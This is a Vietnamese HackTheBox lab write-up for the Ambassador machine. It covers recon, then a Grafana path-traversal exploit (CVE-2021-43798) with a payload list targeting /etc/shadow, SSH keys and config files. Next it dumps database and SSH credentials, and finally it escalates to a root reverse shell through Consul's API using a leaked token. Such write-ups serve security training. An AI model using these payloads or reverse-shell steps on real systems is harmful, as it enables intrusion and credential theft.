---
title: HackTheBox | Medium | Ambassador WriteUp
date: 2023-01-15 
categories: [HackTheBox, Machine]
---

# [Medium] Ambassador WriteUp

# 1. Tổng quan về máy ảo :

## 1.1. Sử dụng dịch vụ của HackTheBox :

- Tải tập tin *.ovpn từ trang quản lý tài khoản sau khi đăng nhập, chọn tải từ Machine.
- Sử dụng OpenVPN để tạo kết nối đến máy chủ của HackTheBox, trong đó *“/home/kali/Desktop/hackthebox/lab_Darko2212.ovpn”* là đường dẫn của tập tin chứa cấu hình cài đặt openvpn.

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox]
└─$ sudo openvpn --config /home/kali/Desktop/hackthebox/lab_Darko2212.ovpn
```

## 1.2. Kiểm tra kết nối đến máy ảo :

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ ping 10.10.11.183
PING 10.10.11.183 (10.10.11.183) 56(84) bytes of data.
64 bytes from 10.10.11.183: icmp_seq=1 ttl=63 time=198 ms
64 bytes from 10.10.11.183: icmp_seq=2 ttl=63 time=198 ms
64 bytes from 10.10.11.183: icmp_seq=3 ttl=63 time=198 ms
64 bytes from 10.10.11.183: icmp_seq=4 ttl=63 time=198 ms
^C
--- 10.10.11.183 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 197.818/198.031/198.418/0.242 ms
```

# 2. Tìm kiếm thông tin :

## Sử dụng nmap → Phát hiện được các cổng như cổng 22, cổng 80, cổng 3000 và cổng 3306.

Trong đó, các cổng sử dụng các dịch vụ như :

Cổng 22 → dịch vụ SSH.

Cổng 80 → dịch vụ HTTP.

Cổng 3000 → trang đăng nhập cho dịch vụ Grafana.

Cổng 3306 → dịch vụ MySQL 8.0.30-0 ubuntu 20.04.2.

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ nmap -sC -sV -Pn 10.10.11.183
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 23:49 EST
Nmap scan report for 10.10.11.183
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 15 Jan 2023 04:50:22 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 15 Jan 2023 04:49:48 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 15 Jan 2023 04:49:54 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 50
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, Support41Auth, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, LongPassword, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Uo\x17\x1EYR\x03\x0DB\x08v4Bqi>Bc%M
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=1/14%Time=63C385EC%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Sun,\x2015\x20Jan\x202023\x2004:49
SF::48\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Su
SF:n,\x2015\x20Jan\x202023\x2004:49:54\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Sun,\x2015\x20Jan\x202023\x2004:50:22\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.31 seconds
```

## Đối với Cổng 80 (sử dụng dịch vụ HTTP)

### Sử dụng curl → tìm thêm các thông tin về trang web

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ curl 10.10.11.183 -I 
HTTP/1.1 200 OK
Date: Sun, 15 Jan 2023 04:51:15 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Fri, 02 Sep 2022 01:37:04 GMT
ETag: "e46-5e7a7c4652f79"
Accept-Ranges: bytes
Content-Length: 3654
Vary: Accept-Encoding
Content-Type: text/html
```

### Sử dụng gobuster → Quét dir (tìm kiếm các thư mực - đường dẫn của trang web) :

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.11.183 -t 100
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.183
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/14 23:54:53 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.183/images/]
/categories           (Status: 301) [Size: 317] [--> http://10.10.11.183/categories/]
/posts                (Status: 301) [Size: 312] [--> http://10.10.11.183/posts/]
/tags                 (Status: 301) [Size: 311] [--> http://10.10.11.183/tags/]
Progress: 87664 / 87665 (100.00%)
===============================================================
2023/01/14 23:57:51 Finished
===============================================================
```

![Untitled](/images/2023-01-16-hackthebox-medium-ambassador/Untitled.png)

![Untitled](/images/2023-01-16-hackthebox-medium-ambassador/Untitled1.png)


## Đối với cổng 3000 (trang đăng nhập của Grafana) :

Thử bấm vào *“Forgot your password?”* thì vào được trang nhập email để thay đổi mật khẩu, mình thấy chỗ version để là *“v8.2.0 (d7f71e9eae)”*

![Untitled](/images/2023-01-16-hackthebox-medium-ambassador/Untitled2.png)

Thử dùng searchsploit để tìm lỗ hổng cho dịch vụ Grafana :

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ searchsploit grafana
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                           | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                       | multiple/webapps/50581.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Tìm kiếm trên google thì lổ hổng “Directory Traversal and Arbitrary File Read” có thể từ phiên bản 8.0.0-beta1 đến 8.3.0 (ngoại trừ bản vá cho phiên bản) , Lổ hổng còn được gọi với tên mã là **CVE-2021-43798,** Link tìm hiểu thêm :

- [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798)
- [https://nvd.nist.gov/vuln/detail/CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)

Kết luận: **có thể khai thác lỗ hổng CVE-2021-43798 để tìm kiếm các thông tin liên quan.**

# 3. Khai thác lỗ hổng :

## Đối với Grafana (*v8.2.0 (d7f71e9eae) :*

Để khai thác lỗ hổng thì mình dùng poc của [pedrohavay](https://github.com/pedrohavay) để tạo payload và dùng để lấy các thông tin có liên quan, đường link sử dụng bên dưới :

- [https://github.com/hupe1980/CVE-2021-43798](https://github.com/hupe1980/CVE-2021-43798)

Quá trình thực hiện thì git clone đường dẫn về rồi cài những thành phần yêu cầu khác bằng pip (hướng dẫn có trên trang github của tác giả).

```
git clone https://github.com/hupe1980/CVE-2021-43798
cd CVE-2021-43798
```

sử dụng bằng cách dùng câu lệnh sau :

```bash
python3 exploit.py http://127.0.0.1:3000 /etc/passwd
python3 exploit.py http://127.0.0.1:3000 /appdata.db --output appdata.db
```

Để tìm kiếm các đường dẫn khác thì có thể tham khảo poc khác của [https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798), trong các tập thì có tập paths.txt chứa các đường dẫn có thể khai thác được như :

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador /exploit-grafana-CVE-2021-43798]
└─$ cat paths.txt 
/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini
/..%2f..%2f..%2f..%2f..%2fconf/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/defaults.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/.bash_history
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/.ssh/id_rsa
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.bash_history
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.ssh/id_rsa
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fusr/local/etc/grafana/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/grafana/grafana.db
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/fib_trie
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/tcp
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/cmdline
```

sử dụng đường dẫn là /etc/grafana/grafana.ini 

→ tìm được tài khoản đăng nhập cho admin là “messageInABottle685427”.

→ tìm được “secret_key = SW2YcwTIb9zpOOhoPsMm”.

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador /CVE-2021-43798]
└─$ python3 exploit.py http://10.10.11.183:3000  /etc/grafana/grafana.ini
```

![Untitled](/images/2023-01-16-hackthebox-medium-ambassador/Untitled3.png)

Thử tiếp với đường dẫn là “/var/lib/grafana/grafana.db”, cái này cần tải tập grafana.db nên dùng câu lệnh có thêm “—output” và thêm tên tập tải, tệp này sẽ lưu trong thư mục đang chạy [exploit.py](http://exploit.py)

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador /CVE-2021-43798]
└─$ python3 exploit.py http://10.10.11.183:3000  /var/lib/grafana/grafana.db --output grafana.db
[+] Trying path http://10.10.11.183:3000/public/plugins/loki/../../../../../../../../../../../../../var/lib/grafana/grafana.db
[+] Done
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador /CVE-2021-43798]
└─$ ls
exploit.py  grafana.db  LICENSE  README.md
```

Sử dụng “DB Browser for SQLite” có sẵn trên Kali Linux để tìm kiếm các thông tin, sử dụng lệnh select để lọc nội dung trong tập “data_source”.

→ thấy được user : grafana/dontStandSoCloseToMe63221!

![Untitled](/images/2023-01-16-hackthebox-medium-ambassador/Untitled4.png)

## Đối với cổng 3306 (dịch vụ MySQL) :

Kết nối vào bằng câu lệnh :

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ mysql -u grafana -p -h 10.10.11.183                                     
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Khai thác thông tin trong các bảng dữ liệu :

→ tìm được tài khoản “developer/YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==”

```bash
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.206 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.196 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.199 sec)

MySQL [whackywidget]>
```

Giải mã base64 vừa tìm được bên trên và thử đăng nhập vào dịch vụ SSH bằng tài khoản “developer”.

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ ssh developer@10.10.11.183
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.183' (ED25519) to the list of known hosts.
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 15 Jan 2023 06:31:38 AM UTC

  System load:           0.03
  Usage of /:            80.9% of 5.07GB
  Memory usage:          39%
  Swap usage:            0%
  Processes:             233
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.183
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c5f7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jan 15 06:20:06 2023 from 10.10.14.40
```

Tìm được flags user.txt 

```bash
developer@ambassador:~$ ls -alh
total 48K
drwxr-xr-x 7 developer developer 4.0K Sep 14 11:01 .
drwxr-xr-x 3 root      root      4.0K Mar 13  2022 ..
lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 developer developer 3.8K Mar 14  2022 .bashrc
drwx------ 3 developer developer 4.0K Mar 13  2022 .cache
-rw-rw-r-- 1 developer developer   93 Sep  2 02:28 .gitconfig
drwx------ 3 developer developer 4.0K Mar 14  2022 .gnupg
drwxrwxr-x 3 developer developer 4.0K Mar 13  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 3 developer developer 4.0K Mar 14  2022 snap
drwx------ 2 developer developer 4.0K Mar 13  2022 .ssh
-rw-r----- 1 root      developer   33 Jan 15 06:19 user.txt
```

# 3. Leo thang đặc quyền :

Thử với sudo -k → không có kết quả.

```bash
developer@ambassador:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on ambassador.
```

Khai thác thông tin thì thử tìm đối với git, thử bằng câu lệnh git log để xem các log.

```bash
developer@ambassador:~$ cd /opt/
developer@ambassador:/opt$ ls
consul  my-app
developer@ambassador:/opt$ cd my-app
developer@ambassador:/opt/my-app$ ls
env  whackywidget
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
```

Thêm thông tin tại lần sử dụng git cuối cùng.

→ thấy được sử dụng “Consul”.

→ tìm kiếm trên google thì có thể sử dụng lỗ hổng để mở Reverse Shell trở thành root.

```bash
developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
developer@ambassador:/opt/my-app$
```

Sử dụng github đã khai thác lỗ hổng của [GatoGamer1155](https://github.com/GatoGamer1155), đường dẫn tham khảo bên dưới :

[https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)

Thử git clone thư mục về, tạo một http server bằng python để vận chuyển tập [exploit.py](http://exploit.py) đến máy nạn nhân,

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador /Hashicorp-Consul-RCE-via-API]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.183 - - [15/Jan/2023 01:43:34] "GET /exploit.py HTTP/1.1" 200 -
```

Tại máy nạn nhân, dùng wget để tải tập tin [exploit.py](http://exploit.py) về máy và thực thi để tiến hành tạo reverse-shell, trước khi bắt đầu thì nên mở netcat trước để bắt reverse-shell

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ nc -lvnp 4444   
listening on [any] 4444 ...
```

```bash
developer@ambassador:/opt/my-app$ cd /tmp
developer@ambassador:/tmp$ wget http://10.10.14.29:8000/exploit.py
--2023-01-15 06:43:34--  http://10.10.14.29:8000/exploit.py
Connecting to 10.10.14.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1409 (1.4K) [text/x-python]
Saving to: ‘exploit.py.1’

exploit.py.1                 100%[==============================================>]   1.38K  --.-KB/s    in 0s      

2023-01-15 06:43:35 (106 MB/s) - ‘exploit.py.1’ saved [1409/1409]

developer@ambassador:/tmp$ ls
exploit.py
exploit.py.1
snap.lxd
systemd-private-88803c4202ff4c3682654fe1e433965d-apache2.service-QoqsRe
systemd-private-88803c4202ff4c3682654fe1e433965d-grafana-server.service-4nETTf
systemd-private-88803c4202ff4c3682654fe1e433965d-ModemManager.service-TBLPqg
systemd-private-88803c4202ff4c3682654fe1e433965d-systemd-logind.service-AXgQRg
systemd-private-88803c4202ff4c3682654fe1e433965d-systemd-resolved.service-CVQycg
systemd-private-88803c4202ff4c3682654fe1e433965d-systemd-timesyncd.service-heUOyf
vmware-root_764-2999067644
developer@ambassador:/tmp$
```

Thực thi đoạn exploit, có thể đánh các option dạng cả chữ hoặc viết tắt cũng được (xem thêm tại trang github của [GatoGamer1155](https://github.com/GatoGamer1155).

```bash
developer@ambassador:/tmp$ python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.29 --lp 4444 --token bb03b43b-1d81-d62b-24b5-39540ee469b5

[+] Request sent successfully, check your listener
                                                                                                                    
developer@ambassador:/tmp$
```

Kết nối thành công và chỉ cần đi đến đường dẫn /root để tìm tập root.txt

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox/Ambassador ]
└─$ nc -lvnp 4444   
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.11.183] 34622
bash: cannot set terminal process group (1894): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/#
```

```bash
root@ambassador:/# cd /root
cd /root
root@ambassador:~# ls -alh
ls -alh
total 56K
drwx------  6 root root 4.0K Sep 14 17:13 .
drwxr-xr-x 20 root root 4.0K Sep 15 17:24 ..
-rw-r--r--  1 root root 3.1K Mar 14  2022 .bashrc
drwx------  2 root root 4.0K Mar 13  2022 .cache
-rwxr-xr-x  1 root root   62 Sep 14 11:00 cleanup.sh
drwxr-xr-x  3 root root 4.0K Sep  7 17:20 .local
lrwxrwxrwx  1 root root    9 Sep  7 17:33 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Jan 15 06:19 root.txt
-rw-r--r--  1 root root   75 Sep  2 02:46 .selected_editor
drwx------  3 root root 4.0K Mar 13  2022 snap
drwx------  2 root root 4.0K Mar 13  2022 .ssh
-rw-------  1 root root 9.9K Sep 14 17:13 .viminfo
root@ambassador:~#
```

# 4. Thu thập Flags :

Sử dụng tài khoản “developer” → tìm được flag user.txt (87xxxxxxxxxxxxxxxxxxxxxxxxxxxxac).


Sử dụng  reverse-shell → tìm được flag root.txt (80xxxxxxxxxxxxxxxxxxxxxxxxxxxx4a).

# 5. Tài liệu tham khảo :

[https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)

[https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)

[https://github.com/hupe1980/CVE-2021-43798/blob/main/exploit.py](https://github.com/hupe1980/CVE-2021-43798/blob/main/exploit.py)

[https://cybersaradiyel.com/ambassador-hackthebox-walkthrough/](https://cybersaradiyel.com/ambassador-hackthebox-walkthrough/)